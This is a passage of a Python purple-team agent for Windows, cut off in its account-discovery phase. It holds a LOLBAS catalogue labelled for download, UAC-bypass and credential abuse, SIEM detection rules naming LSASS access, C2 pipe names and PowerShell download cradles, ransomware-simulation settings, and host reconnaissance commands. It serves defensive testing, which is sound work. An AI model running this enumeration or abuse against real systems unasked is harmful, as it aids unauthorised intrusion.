#!/usr/bin/env python3
"""
Purple Team Agent v5.0 — Advanced Windows LOLBAS Edition
===========================================================
Native Windows purple-team framework using Living Off The Land Binaries
and Scripts (LOLBAS) for adversary simulation. No external dependencies
beyond Python stdlib + optional cryptography for Phase 10.

Features:
  • 12 reconnaissance phases mapped to MITRE ATT&CK
  • Dedicated LOLBAS abuse demonstration phase
  • Concurrent execution engine for speed
  • HTML + JSON + text reporting
  • Risk-scored findings with remediation hints
  • Reversible ransomware simulation
  • EICAR AV detection test
  • WMI / scheduled-task persistence simulation
  • Lateral movement reconnaissance

Usage:
    python agent.py [--all] [--phase N[,N]] [--decrypt] [--cleanup]
    python agent.py --report-only   # Re-generate HTML from last JSON log
"""

from __future__ import annotations

import argparse
import base64
import concurrent.futures
import html
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
import uuid
import webbrowser
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, List, Optional, Tuple

# ───────────────────────────────────────────────────────────────────────────
# CONFIGURATION
# ───────────────────────────────────────────────────────────────────────────

SCRIPT_VERSION = "5.0-Py"
TIMEOUT_SECONDS = 25
MAX_WORKERS = 4

RANSOM_SIM_DIR = Path(os.environ.get("TEMP", "/tmp")) / "purpleteam_ransom_sim"
RANSOM_KEY = "PurpleTeam_Decrypt_Key_2024!"
RANSOM_EXT = ".locked"
RANSOM_MANIFEST = RANSOM_SIM_DIR / ".manifest"

EICAR = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

# ───────────────────────────────────────────────────────────────────────────
# LOLBAS CATALOGUE
# ───────────────────────────────────────────────────────────────────────────
# Each entry:  key -> (binary_name, category, description)
# Categories:  execution, encode, download, uac_bypass, creds, recon, other

LOLBAS_CATALOGUE: Dict[str, Tuple[str, str, str]] = {
    "cmd":          ("cmd.exe",         "execution",   "Command interpreter"),
    "powershell":   ("powershell.exe",  "execution",   "PowerShell engine"),
    "wmic":         ("wmic.exe",        "recon",       "WMI command-line"),
    "reg":          ("reg.exe",         "recon",       "Registry tool"),
    "certutil":     ("certutil.exe",    "encode",      "Certificate utility — abuse for encode/decode/download"),
    "bitsadmin":    ("bitsadmin.exe",   "download",    "Background transfer — abuse for downloads"),
    "mshta":        ("mshta.exe",       "execution",   "HTML Application host"),
    "cscript":      ("cscript.exe",     "execution",   "Windows Script Host (console)"),
    "wscript":      ("wscript.exe",     "execution",   "Windows Script Host (GUI)"),
    "rundll32":     ("rundll32.exe",    "execution",   "DLL execution proxy"),
    "netsh":        ("netsh.exe",       "recon",       "Network shell"),
    "nltest":       ("nltest.exe",      "recon",       "Netlogon test — domain trust enumeration"),
    "net":          ("net.exe",         "recon",       "Network commands"),
    "tasklist":     ("tasklist.exe",    "recon",       "Process lister"),
    "sc":           ("sc.exe",          "recon",       "Service controller"),
    "schtasks":     ("schtasks.exe",    "execution",   "Task scheduler"),
    "driverquery":  ("driverquery.exe", "recon",       "Driver enumerator"),
    "systeminfo":   ("systeminfo.exe",  "recon",       "System information"),
    "ipconfig":     ("ipconfig.exe",    "recon",       "IP configuration"),
    "route":        ("route.exe",       "recon",       "Routing table"),
    "arp":          ("arp.exe",         "recon",       "ARP cache"),
    "wevtutil":     ("wevtutil.exe",    "recon",       "Event log utility"),
    "vssadmin":     ("vssadmin.exe",    "recon",       "Volume Shadow Copy admin"),
    "bcdedit":      ("bcdedit.exe",     "recon",       "Boot configuration"),
    "icacls":       ("icacls.exe",      "recon",       "ACL tool"),
    "findstr":      ("findstr.exe",     "recon",       "String finder — abuse for file reading"),
    "whoami":       ("whoami.exe",      "recon",       "User identity"),
    "hostname":     ("hostname.exe",    "recon",       "Hostname"),
    "auditpol":     ("auditpol.exe",    "recon",       "Audit policy"),
    "logman":       ("logman.exe",      "recon",       "ETW / performance log"),
    "cmdkey":       ("cmdkey.exe",      "creds",       "Credential manager"),
    "qwinsta":      ("qwinsta.exe",     "recon",       "Session enumerator"),
    "fltmc":        ("fltmc.exe",       "recon",       "Filter manager"),
    "fsutil":       ("fsutil.exe",      "recon",       "Filesystem utility"),
    "nbtstat":      ("nbtstat.exe",     "recon",       "NetBIOS statistics"),
    "tracert":      ("tracert.exe",     "recon",       "Traceroute"),
    "ping":         ("ping.exe",        "recon",       "ICMP probe"),
    "nslookup":     ("nslookup.exe",    "recon",       "DNS lookup"),
    "certreq":      ("certreq.exe",     "encode",      "Certificate request — abuse for file download"),
    "makecab":      ("makecab.exe",     "other",       "Cabinet maker — abuse for compression"),
    "expand":       ("expand.exe",      "other",       "Cabinet expander"),
    "esentutl":     ("esentutl.exe",    "other",       "ESENT utility — abuse for copying locked files"),
    "robocopy":     ("robocopy.exe",    "other",       "Robust file copy"),
    "xcopy":        ("xcopy.exe",       "other",       "Extended copy"),
    "forfiles":     ("forfiles.exe",    "execution",   "File enumerator — abuse for command execution"),
    "diskshadow":   ("diskshadow.exe",  "other",       "Shadow copy scripting"),
    "manage_bde":   ("manage-bde.exe",  "recon",       "BitLocker management"),
    "wbadmin":      ("wbadmin.exe",     "recon",       "Windows Backup admin"),
    "winrs":        ("winrs.exe",       "execution",   "Remote shell client"),
    "wusa":         ("wusa.exe",        "uac_bypass",  "Windows Update standalone — abuse for UAC bypass"),
    "eventvwr":     ("eventvwr.exe",    "uac_bypass",  "Event Viewer — abuse for UAC bypass / hijack"),
    "fodhelper":    ("fodhelper.exe",   "uac_bypass",  "FOD helper — abuse for UAC bypass"),
    "computerdefaults": ("computerdefaults.exe", "uac_bypass", "Default apps — UAC bypass"),
}

# ───────────────────────────────────────────────────────────────────────────
# ANSI COLOURS
# ───────────────────────────────────────────────────────────────────────────

class C:
    R = "\033[0;31m";  G = "\033[0;32m";  Y = "\033[1;33m"
    B = "\033[0;34m";  M = "\033[0;35m";  CYN = "\033[0;36m"
    W = "\033[1;37m";  D = "\033[0;90m";  BD = "\033[1m"
    DM = "\033[2m";    RS = "\033[0m"


def _enable_ansi() -> None:
    if sys.platform == "win32":
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        except Exception:
            pass


def _ts() -> str:
    return datetime.now().strftime("%H:%M:%S")


def _elapsed(start: float) -> str:
    e = int(time.time() - start)
    return f"{e // 60}m {e % 60}s"


def _banner(text: str, colour: str = C.CYN) -> None:
    lines = text.strip().split("\n")
    w = max(len(l) for l in lines) + 4
    print(f"{colour}╔{'═' * (w - 2)}╗{C.RS}")
    for line in lines:
        print(f"{colour}║{C.RS} {line.ljust(w - 4)} {colour}║{C.RS}")
    print(f"{colour}╚{'═' * (w - 2)}╝{C.RS}")


def _ok(msg: str, tech: str = "") -> None:
    t = f" [{tech}]" if tech else ""
    print(f"  {C.G}[✓]{C.RS} {C.G}{msg}{C.RS}{C.D}{t}{C.RS}")


def _err(msg: str, tech: str = "") -> None:
    t = f" [{tech}]" if tech else ""
    print(f"  {C.R}[✗]{C.RS} {C.R}{msg}{C.RS}{C.D}{t}{C.RS}")


def _warn(msg: str, tech: str = "") -> None:
    t = f" [{tech}]" if tech else ""
    print(f"  {C.Y}[!]{C.RS} {C.Y}{msg}{C.RS}{C.D}{t}{C.RS}")


def _info(msg: str, tech: str = "") -> None:
    t = f" [{tech}]" if tech else ""
    print(f"  {C.B}[i]{C.RS} {C.B}{msg}{C.RS}{C.D}{t}{C.RS}")


def _act(msg: str, tech: str = "") -> None:
    t = f" [{tech}]" if tech else ""
    print(f"  {C.M}[→]{C.RS} {C.M}{msg}{C.RS}{C.D}{t}{C.RS}")


def _det(msg: str) -> None:
    print(f"    {C.D}{msg}{C.RS}")


def _find(sev: str, msg: str) -> None:
    col = C.W
    if sev == "CRITICAL": col = C.R
    elif sev == "HIGH":   col = C.R
    elif sev == "MEDIUM":  col = C.Y
    elif sev == "LOW":     col = C.CYN
    elif sev == "INFO":    col = C.D
    print(f"    {col}[{sev}]{C.RS} {msg}")


# ───────────────────────────────────────────────────────────────────────────
# DATA CLASSES
# ───────────────────────────────────────────────────────────────────────────

@dataclass
class Finding:
    severity: str          # CRITICAL / HIGH / MEDIUM / LOW / INFO
    technique: str
    message: str
    remediation: str = ""
    detection: str = ""


@dataclass
class ActionResult:
    success: bool
    stdout: str
    stderr: str
    technique: str
    description: str
    command: str


@dataclass
class DetectionResult:
    test_id: str            # "DT-001" … "DT-008"
    test_name: str          # human label
    technique: str          # primary MITRE ATT&CK ID
    outcome: str            # "EXECUTED" | "BLOCKED" | "ERROR"
    detail: str             # what happened
    expected_events: List[str]  # what the blue team should see in their SIEM/EDR


# ───────────────────────────────────────────────────────────────────────────
# SIEM DETECTION RULES
# ───────────────────────────────────────────────────────────────────────────

SIEM_RULES: List[Dict] = [
    {
        "id": "SR-001",
        "title": "LSASS Process Memory Access by Non-System Process",
        "severity": "CRITICAL",
        "mitre": "T1003.001",
        "log_source": "Sysmon EventID 10 (ProcessAccess)",
        "platforms": ["Microsoft Sentinel", "Splunk", "Elastic SIEM", "QRadar"],
        "sigma_detection": (
            "selection:\n"
            "  EventID: 10\n"
            "  TargetImage|endswith: '\\\\lsass.exe'\n"
            "  GrantedAccess|contains:\n"
            "    - '0x1010'    # PROCESS_VM_READ | PROCESS_QUERY_INFORMATION\n"
            "    - '0x1410'\n"
            "    - '0x143a'\n"
            "    - '0x1fffff'  # All access\n"
            "filter_legit:\n"
            "  SourceImage|startswith:\n"
            "    - 'C:\\\\Windows\\\\System32\\\\'\n"
            "    - 'C:\\\\Program Files\\\\Windows Defender\\\\'\n"
            "condition: selection and not filter_legit"
        ),
        "false_positives": ["AV/EDR processes", "Microsoft crash dump tools"],
        "response": "Isolate immediately; dump memory of SourceImage for analysis; check for MiniDump artefacts",
    },
    {
        "id": "SR-002",
        "title": "Cobalt Strike / Known C2 Framework Named Pipe",
        "severity": "CRITICAL",
        "mitre": "T1071",
        "log_source": "Sysmon EventID 17 (PipeCreated)",
        "platforms": ["Microsoft Sentinel", "Splunk", "Elastic SIEM"],
        "sigma_detection": (
            "selection:\n"
            "  EventID: 17\n"
            "  PipeName|contains:\n"
            "    - 'MSSE-'\n"
            "    - 'postex_ssh'\n"
            "    - 'status_'\n"
            "    - 'msagent_'\n"
            "    - 'mypipe-f'\n"
            "    - 'mypipe-h'\n"
            "    - 'ntsvcs'\n"
            "    - 'scerpc'\n"
            "    - 'win_svc'\n"
            "    - 'demoagent_11'\n"
            "condition: selection"
        ),
        "false_positives": ["Purple team exercises (should still alert)"],
        "response": "Active compromise assumed — isolate host, capture memory, open P1 incident",
    },
    {
        "id": "SR-003",
        "title": "PowerShell EncodedCommand Execution",
        "severity": "HIGH",
        "mitre": "T1059.001",
        "log_source": "Security EventID 4104 (Script Block Logging) / Sysmon EventID 1",
        "platforms": ["Microsoft Sentinel", "Splunk", "Elastic SIEM", "QRadar"],
        "sigma_detection": (
            "selection_proc:\n"
            "  EventID: 1\n"
            "  Image|endswith: '\\\\powershell.exe'\n"
            "  CommandLine|contains:\n"
            "    - '-EncodedCommand'\n"
            "    - '-enc '\n"
            "    - '-ec '\n"
            "selection_block:\n"
            "  EventID: 4104\n"
            "  ScriptBlockText|base64offset|contains:\n"
            "    - 'IEX'\n"
            "    - 'Invoke-Expression'\n"
            "    - 'DownloadString'\n"
            "    - 'WebClient'\n"
            "condition: selection_proc or selection_block"
        ),
        "false_positives": ["Some legitimate automation tools"],
        "response": "Decode base64 payload; review parent process; correlate with network connections",
    },
    {
        "id": "SR-004",
        "title": "Suspicious Registry Run Key — Persistence Artefact",
        "severity": "HIGH",
        "mitre": "T1547.001",
        "log_source": "Security EventID 4657 (Registry value modified)",
        "platforms": ["Microsoft Sentinel", "Splunk", "Elastic SIEM", "QRadar"],
        "sigma_detection": (
            "selection:\n"
            "  EventID: 4657\n"
            "  ObjectName|contains:\n"
            "    - '\\\\CurrentVersion\\\\Run'\n"
            "    - '\\\\CurrentVersion\\\\RunOnce'\n"
            "  OperationType: '%%1904'   # New registry value created\n"
            "filter_known_software:\n"
            "  SubjectUserName|endswith: '$'  # Machine accounts\n"
            "condition: selection and not filter_known_software"
        ),
        "false_positives": ["Software installers", "Group Policy updates"],
        "response": "Review value data (binary path); check if binary exists; hunt for LOLBin pointing to unusual path",
    },
    {
        "id": "SR-005",
        "title": "Suspicious Scheduled Task Created",
        "severity": "HIGH",
        "mitre": "T1053.005",
        "log_source": "Security EventID 4698 (Task Created) / Sysmon EventID 1 (schtasks.exe)",
        "platforms": ["Microsoft Sentinel", "Splunk", "Elastic SIEM", "QRadar"],
        "sigma_detection": (
            "selection_event:\n"
            "  EventID: 4698\n"
            "selection_proc:\n"
            "  EventID: 1\n"
            "  Image|endswith: '\\\\schtasks.exe'\n"
            "  CommandLine|contains: '/create'\n"
            "filter_legit:\n"
            "  CommandLine|contains:\n"
            "    - 'MicrosoftEdgeUpdate'\n"
            "    - 'OneDrive'\n"
            "    - 'GoogleUpdate'\n"
            "condition: (selection_event or selection_proc) and not filter_legit"
        ),
        "false_positives": ["Legitimate software installation"],
        "response": "Review task XML (TaskName, Action, Trigger); check if action binary is signed; correlate with user session",
    },
    {
        "id": "SR-006",
        "title": "Security Event Log Clear Attempt",
        "severity": "CRITICAL",
        "mitre": "T1070.001",
        "log_source": "Security EventID 1102 (log cleared) / System EventID 104",
        "platforms": ["Microsoft Sentinel", "Splunk", "Elastic SIEM", "QRadar"],
        "sigma_detection": (
            "selection:\n"
            "  EventID:\n"
            "    - 1102   # Security log cleared\n"
            "    - 104    # System log cleared\n"
            "  Channel:\n"
            "    - Security\n"
            "    - System\n"
            "condition: selection"
        ),
        "false_positives": ["Authorised log rotation (should still alert and be reviewed)"],
        "response": "P1 — treat as active anti-forensics; review who cleared and from which host; check for lateral movement",
    },
    {
        "id": "SR-007",
        "title": "DGA-Pattern or C2-Subdomain DNS Query",
        "severity": "MEDIUM",
        "mitre": "T1071.004",
        "log_source": "DNS Server Analytic Log / Firewall / Sysmon EventID 22 (DNSQuery)",
        "platforms": ["Microsoft Sentinel", "Splunk", "Elastic SIEM", "Palo Alto Cortex"],
        "sigma_detection": (
            "selection:\n"
            "  EventID: 22\n"
            "  QueryName|re: '^[a-f0-9]{8,}\\..*'   # Hex DGA-like subdomain\n"
            "  QueryName|contains:\n"
            "    - 'cdn-delivery'\n"
            "    - 'telemetry-'\n"
            "    - 'update.windows'\n"
            "    - 'beacon.'\n"
            "condition: selection"
        ),
        "false_positives": ["Legitimate CDN subdomains (tune with allowlist)"],
        "response": "Check DNS resolver logs for full FQDN; correlate with process making request (Sysmon 22 QueryName+Image); block domain at DNS layer",
    },
    {
        "id": "SR-008",
        "title": "Privilege Escalation Indicator — Token Enumeration",
        "severity": "MEDIUM",
        "mitre": "T1134",
        "log_source": "Security EventID 4672 / Sysmon EventID 1 (whoami /priv)",
        "platforms": ["Microsoft Sentinel", "Splunk", "Elastic SIEM"],
        "sigma_detection": (
            "selection:\n"
            "  EventID: 1\n"
            "  Image|endswith: '\\\\whoami.exe'\n"
            "  CommandLine|contains:\n"
            "    - '/priv'\n"
            "    - '/groups'\n"
            "    - '/all'\n"
            "condition: selection"
        ),
        "false_positives": ["Developers/admins doing manual checks"],
        "response": "Correlate with preceding actions; if combined with other TTPs in this list escalate immediately",
    },
]

# ───────────────────────────────────────────────────────────────────────────
# LOGGER
# ───────────────────────────────────────────────────────────────────────────

class Logger:
    def __init__(self):
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.run_id = str(uuid.uuid4())[:8]
        base = Path(os.environ.get("TEMP", "/tmp"))
        self.txt = base / f"purpleteam_{ts}_{self.run_id}.log"
        self.json = base / f"purpleteam_{ts}_{self.run_id}.json"
        self.html = base / f"purpleteam_{ts}_{self.run_id}.html"
        self.events: List[Dict] = []
        self.findings: List[Finding] = []
        self.detection_results: List[DetectionResult] = []
        self.start = time.time()
        self.phase = ""
        self.phase_start = 0.0
        self.phase_findings: List[str] = []

        with open(self.txt, "w", encoding="utf-8") as f:
            f.write("╔═══════════════════════════════════════════════════════════════════════╗\n")
            f.write(f"║ PURPLE TEAM AGENT v{SCRIPT_VERSION} — EXECUTION LOG ║\n")
            f.write("╚═══════════════════════════════════════════════════════════════════════╝\n\n")
            f.write(f" Run ID:       {self.run_id}\n")
            f.write(f" Start Time:   {datetime.now().strftime('%d/%m/%Y %H:%M:%S %Z')}\n")
            f.write(f" Operator:     {os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USERNAME', 'unknown')}\n")
            f.write(f" Hostname:     {os.environ.get('COMPUTERNAME', 'unknown')}\n")
            f.write(f" PID:          {os.getpid()}\n")
            f.write(f" Text Log:     {self.txt}\n")
            f.write(f" JSON Log:     {self.json}\n")
            f.write(f" HTML Report:  {self.html}\n\n")

    def write(self, indent: int, msg: str) -> None:
        with open(self.txt, "a", encoding="utf-8") as f:
            f.write(" " * indent + msg + "\n")

    def json_event(self, status: str, technique: str, phase: str, description: str,
                   detail: str = "", command: str = "") -> None:
        self.events.append({
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "elapsed": int(time.time() - self.start),
            "status": status, "technique": technique, "phase": phase,
            "description": description, "detail": detail, "command": command,
        })

    def add_finding(self, f: Finding) -> None:
        self.findings.append(f)
        self.phase_findings.append(f"[{f.severity}] {f.message}")

    def finalize(self, total: int, success: int, failed: int, skipped: int) -> None:
        data = {
            "meta": {
                "version": SCRIPT_VERSION, "run_id": self.run_id,
                "start": datetime.fromtimestamp(self.start, tz=timezone.utc).isoformat(),
                "end": datetime.now(timezone.utc).isoformat(),
                "duration": int(time.time() - self.start),
            },
            "summary": {"total": total, "success": success, "failed": failed, "skipped": skipped},
            "findings": [
                {"severity": f.severity, "technique": f.technique, "message": f.message,
                 "remediation": f.remediation, "detection": f.detection}
                for f in self.findings
            ],
            "events": self.events,
            "detection_results": [
                {"id": r.test_id, "test": r.test_name, "technique": r.technique,
                 "outcome": r.outcome, "detail": r.detail,
                 "expected_events": r.expected_events}
                for r in self.detection_results
            ],
        }
        with open(self.json, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)


log = Logger()

# ───────────────────────────────────────────────────────────────────────────
# EXECUTOR
# ───────────────────────────────────────────────────────────────────────────

class Executor:
    def __init__(self):
        self.total = 0
        self.ok = 0
        self.fail = 0
        self.skip = 0
        self._cache: Dict[str, str] = {}

    def _resolve(self, name: str) -> str:
        if name in self._cache:
            return self._cache[name]
        if name in LOLBAS_CATALOGUE:
            binary = LOLBAS_CATALOGUE[name][0]
            for d in os.environ.get("PATH", "").split(os.pathsep):
                p = Path(d) / binary
                if p.exists():
                    self._cache[name] = str(p)
                    return str(p)
            for sub in ("System32", "SysWOW64"):
                p = Path(os.environ.get("SystemRoot", r"C:\Windows")) / sub / binary
                if p.exists():
                    self._cache[name] = str(p)
                    return str(p)
            self._cache[name] = binary
            return binary
        self._cache[name] = name
        return name

    def run(self, binary: str, args: List[str], technique: str, description: str,
            shell: bool = False, capture: bool = True) -> ActionResult:
        self.total += 1
        _act(description, technique)
        cmd = [self._resolve(binary)] + args
        cmd_str = " ".join(cmd)
        log.write(4, f"[{_ts()}] [ACTION] {description} | {technique}")
        log.write(8, f"Command: {cmd_str}")
        try:
            r = subprocess.run(cmd, capture_output=capture, text=True, timeout=TIMEOUT_SECONDS,
                               shell=shell, errors="replace")
            out = r.stdout or ""
            err = r.stderr or ""
            if r.returncode == 0:
                self.ok += 1
                _ok(description, technique)
                log.write(8, f"Status: SUCCESS")
                for line in out.strip().split("\n")[:20]:
                    log.write(12, line)
                lines = out.strip().split("\n")
                if len(lines) <= 8:
                    for line in lines: _det(line[:120])
                else:
                    for line in lines[:6]: _det(line[:120])
                    _det(f"... ({len(lines)} lines total)")
                log.json_event("SUCCESS", technique, log.phase, description, out[:500], cmd_str)
                return ActionResult(True, out, err, technique, description, cmd_str)
            else:
                self.fail += 1
                emsg = err.strip().split("\n")[0] if err.strip() else f"exit {r.returncode}"
                _err(f"{description} — {emsg}", technique)
                log.write(8, f"Status: FAILED | {emsg}")
                log.json_event("FAILED", technique, log.phase, description, emsg, cmd_str)
                return ActionResult(False, out, err, technique, description, cmd_str)
        except subprocess.TimeoutExpired:
            self.fail += 1
            _err(f"{description} — Timeout ({TIMEOUT_SECONDS}s)", technique)
            log.json_event("TIMEOUT", technique, log.phase, description, "Timeout", cmd_str)
            return ActionResult(False, "", "Timeout", technique, description, cmd_str)
        except FileNotFoundError:
            self.fail += 1
            _err(f"{description} — Binary not found: {cmd[0]}", technique)
            log.json_event("FAILED", technique, log.phase, description, f"Binary not found: {cmd[0]}", cmd_str)
            return ActionResult(False, "", f"Binary not found: {cmd[0]}", technique, description, cmd_str)
        except Exception as exc:
            self.fail += 1
            _err(f"{description} — {exc}", technique)
            log.json_event("FAILED", technique, log.phase, description, str(exc), cmd_str)
            return ActionResult(False, "", str(exc), technique, description, cmd_str)

    def ps(self, command: str, technique: str, description: str) -> ActionResult:
        return self.run("powershell", ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass",
                                          "-Command", command], technique, description)

    def cmd(self, command: str, technique: str, description: str) -> ActionResult:
        return self.run("cmd", ["/c", command], technique, description)

    def wmic(self, query: str, technique: str, description: str) -> ActionResult:
        return self.run("wmic", ["/NAMESPACE:\\\\root\\\\cimv2", query], technique, description)

    def reg(self, op: str, key: str, technique: str, description: str, value: str = "") -> ActionResult:
        args = [op, key]
        if value:
            args += ["/v", value]
        args.append("/s")
        return self.run("reg", args, technique, description)

    def concurrent(self, tasks: List[Tuple]) -> List[ActionResult]:
        """Execute a list of (fn, args, kwargs) tuples concurrently."""
        results: List[ActionResult] = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
            futures = {ex.submit(t[0], *t[1], **t[2]): i for i, t in enumerate(tasks)}
            for future in concurrent.futures.as_completed(futures):
                try:
                    results.append(future.result())
                except Exception as exc:
                    results.append(ActionResult(False, "", str(exc), "", "", ""))
        return results


exe = Executor()

# ───────────────────────────────────────────────────────────────────────────
# PHASE HELPERS
# ───────────────────────────────────────────────────────────────────────────

def begin_phase(number: str, title: str, techniques: str, description: str) -> None:
    log.phase = f"Phase {number}"
    log.phase_start = time.time()
    log.phase_findings = []
    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    el = _elapsed(log.start)
    print()
    print(f"{C.CYN}╔══════════════════════════════════════════════════════════════════════╗{C.RS}")
    print(f"{C.CYN}║{C.RS} {C.BD}PHASE {number}: {title}{C.RS}")
    print(f"{C.CYN}║{C.RS} {C.D}MITRE ATT&CK: {techniques}{C.RS}")
    print(f"{C.CYN}║{C.RS} {C.D}{description}{C.RS}")
    print(f"{C.CYN}║{C.RS} {C.D}Started: {now} (elapsed: {el}){C.RS}")
    print(f"{C.CYN}╚══════════════════════════════════════════════════════════════════════╝{C.RS}")
    print()
    log.write(0, "")
    log.write(0, f"══════════════════════════════════════════════════════════════════")
    log.write(0, f"PHASE {number}: {title}")
    log.write(0, f"Techniques: {techniques}")
    log.write(0, f"Started: {now} (total elapsed: {el})")
    log.write(0, f"──────────────────────────────────────────────────────────────────")
    log.write(0, "")


def end_phase() -> None:
    dur = int(time.time() - log.phase_start)
    end = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    if log.phase_findings:
        print()
        print(f"  {C.W}── Findings ({len(log.phase_findings)}) ──{C.RS}")
        for f in log.phase_findings:
            print(f"  {f}")
    print()
    print(f"  {C.D}{log.phase} completed at {end} ({dur}s elapsed, total {_elapsed(log.start)}){C.RS}")
    log.write(0, "")
    log.write(0, f"── Phase Findings ({len(log.phase_findings)}) ──")
    for f in log.phase_findings:
        log.write(0, f"  {f}")
    log.write(0, f"Finished: {end}")
    log.write(0, f"Duration: {dur}s (total elapsed: {_elapsed(log.start)})")
    log.write(0, f"──────────────────────────────────────────────────────────────────")
    log.write(0, "")


# ───────────────────────────────────────────────────────────────────────────
# PHASE 0: ENVIRONMENT DETECTION
# ───────────────────────────────────────────────────────────────────────────

def phase_env() -> None:
    begin_phase("0", "Environment Detection", "T1082",
                "Verify Windows runtime, LOLBAS binary availability, and execution context")
    if sys.platform != "win32":
        _err("Not running on Windows — this agent requires Windows", "T1082")
        sys.exit(1)
    _ok("Running on Windows", "T1082")

    # Enumerate available LOLBAS binaries
    available = []
    missing = []
    for key, (binary, cat, desc) in LOLBAS_CATALOGUE.items():
        path = exe._resolve(key)
        if Path(path).exists():
            available.append((key, cat, desc))
        else:
            try:
                subprocess.run([path, "/?"], capture_output=True, timeout=2)
                available.append((key, cat, desc))
            except Exception:
                missing.append(key)

    _ok(f"{len(available)} LOLBAS binaries available", "T1082")
    for key, cat, desc in available[:5]:
        _det(f"  {key} ({cat}): {desc}")
    if missing:
        _warn(f"Missing: {', '.join(missing[:5])}")

    r = exe.ps("Write-Output 'test'", "T1082", "PowerShell execution test")
    if r.success and "test" in r.stdout:
        _ok("PowerShell execution verified", "T1082")
    else:
        _err("PowerShell execution test failed", "T1082")

    exe.run("hostname", [], "T1082", "Hostname detection")
    exe.cmd("echo %USERNAME%", "T1082", "Current user detection")
    exe.run("whoami", [], "T1082", "User identity")

    # Privilege check
    r = exe.ps("([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)",
               "T1082", "Admin privilege check")
    if r.success and "True" in r.stdout:
        log.add_finding(Finding(
            "HIGH", "T1082", "Agent running with Administrator privileges",
            remediation="Run purple-team exercises from standard user context when possible",
            detection="Event ID 4672 (Special privileges assigned)"))
        _find("HIGH", "Running as Administrator — elevated privileges detected")

    end_phase()


# ───────────────────────────────────────────────────────────────────────────
# PHASE 1: SYSTEM & ENVIRONMENT PROFILING
# ───────────────────────────────────────────────────────────────────────────

def phase_system() -> None:
    begin_phase("1", "System & Environment Profiling",
                "T1082, T1497.001, T1614, T1614.001",
                "Fingerprint OS, hardware, virtualisation, language, security stack")

    # Concurrent execution of independent recon tasks
    tasks = [
        (exe.run, ("systeminfo", [], "T1082", "System information"), {}),
        (exe.wmic, ("os get Caption,Version,BuildNumber,OSArchitecture,TotalVisibleMemorySize /format:list",
                    "T1082", "OS version via WMIC"), {}),
        (exe.wmic, ("qfe get HotFixID,Description,InstalledOn /format:list",
                    "T1082", "Installed hotfixes via WMIC"), {}),
        (exe.wmic, ("computersystem get Model,Manufacturer,HypervisorPresent,PartOfDomain,Domain /format:list",
                    "T1497.001", "Virtualisation & domain via WMIC"), {}),
        (exe.wmic, ("bios get SMBIOSBIOSVersion,Manufacturer,SerialNumber /format:list",
                    "T1497.001", "BIOS fingerprint via WMIC"), {}),
    ]
    exe.concurrent(tasks)

    # Defender status
    r = exe.ps(
        "try { $s=Get-MpComputerStatus; $s|Select-Object AntivirusEnabled,RealTimeProtectionEnabled,"
        "BehaviorMonitorEnabled,IoavProtectionEnabled,NISEnabled,AntivirusSignatureLastUpdated|Format-List }"
        "catch { Write-Output 'Defender unavailable' }", "T1518.001", "Windows Defender status")
    if r.success and "False" in r.stdout:
        log.add_finding(Finding(
            "CRITICAL", "T1518.001", "Windows Defender real-time protection is DISABLED",
            remediation="Enable real-time protection immediately",
            detection="Event ID 5001 (Windows Defender)"))
        _find("CRITICAL", "Defender real-time protection is DISABLED")

    # AV products via SecurityCenter2
    exe.run("wmic", ["/NAMESPACE:\\\\root\\\\SecurityCenter2", "PATH",
                     "AntiVirusProduct", "GET",
                     "displayName,productState,pathToSignedProductExe",
                     "/format:list"],
             "T1518.001", "Registered AV products via WMIC")

    # Locale & UAC
    exe.reg("query", r"HKLM\SYSTEM\CurrentControlSet\Control\Nls\Language", "T1614.001", "System locale")
    exe.reg("query", r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "T1082",
            "UAC configuration", "EnableLUA")

    # .NET & PS versions
    exe.reg("query", r"HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full", "T1082", ".NET version")
    exe.ps("$PSVersionTable | Format-List", "T1082", "PowerShell version")

    # BitLocker
    exe.run("manage_bde", ["-status"], "T1082", "BitLocker status")

    # Check for common sandbox / VM indicators
    r = exe.wmic("computersystem get Model /value", "T1497.001", "VM model check")
    if r.success:
        model = r.stdout.lower()
        vm_indicators = ["vmware", "virtualbox", "hyper-v", "xen", "parallels", "qemu", "virtual machine"]
        for ind in vm_indicators:
            if ind in model:
                log.add_finding(Finding(
                    "INFO", "T1497.001", f"Virtual machine detected: {ind}",
                    remediation="N/A — informational for purple team context",
                    detection="N/A"))
                _find("INFO", f"VM/Sandbox detected: {ind}")
                break

    end_phase()


# ───────────────────────────────────────────────────────────────────────────
# PHASE 2: ACCOUNT & PRIVILEGE DISCOVERY
# ───────────────────────────────────────────────────────────────────────────

def phase_accounts() -> None:
    begin_phase("2", "Account & Privilege Discovery",
                "T1087.001, T1087.002, T1069.001, T1069.002, T1201, T1033",
                "Enumerate local/domain accounts, groups, privileges, password policy")

    exe.run("whoami", ["/all"], "T1033", "Current user identity & privileges")
    exe.run("net", ["user"], "T1087.001", "Local user accounts")
    exe.run("net", ["localgroup"], "T1069.001", "Local groups")
    exe.run("net", ["localgroup", "Administrators"], "T1069.001", "Administrators group")
    exe.run("net", ["localgroup", "Remote Desktop Users"], "T1069.001", "RDP Users group")
    exe.run("net", ["accounts"], "T1201", "Local password policy")
    exe.run("nltest", ["/domain_trusts"], "T1482", "Domain trusts")
    exe.run("nltest", ["/dclist:%USERDOMAIN%"], "T1018", "Domain controllers")
    exe.cmd("net accounts /domain 2>nul", "T1201", "Domain password policy")
    exe.run("qwinsta", [], "T1033", "Logged-on sessions")

    # Domain admin enumeration via ADSI
    r = exe.ps(
